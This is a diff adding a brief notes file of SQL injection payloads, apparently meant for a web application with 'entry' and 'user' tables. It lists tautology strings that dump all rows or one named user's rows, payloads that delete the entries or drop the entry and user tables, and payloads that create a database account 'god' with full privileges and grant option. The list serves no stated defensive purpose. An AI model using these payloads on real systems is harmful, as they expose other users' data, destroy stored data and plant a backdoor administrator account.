@@ -1,0 +1,15 @@
+show all (WHITESPACE!):
+%') OR '1'='1'; -- '
+
+show all from user with name:
+%') OR '1'='1' AND user_id=(SELECT id FROM user WHERE login='karin'); -- '
+
+drop table:
+'; DELETE FROM entry; -- '
+'; DROP TABLE entry; -- '
+'; DROP TABLE user; -- '
+
+dba:
+'; CREATE USER god IDENTIFIED BY 'god'; -- '
+'; GRANT ALL PRIVILEGES ON *.* TO god@'%' IDENTIFIED BY 'god' WITH GRANT OPTION; -- '
+
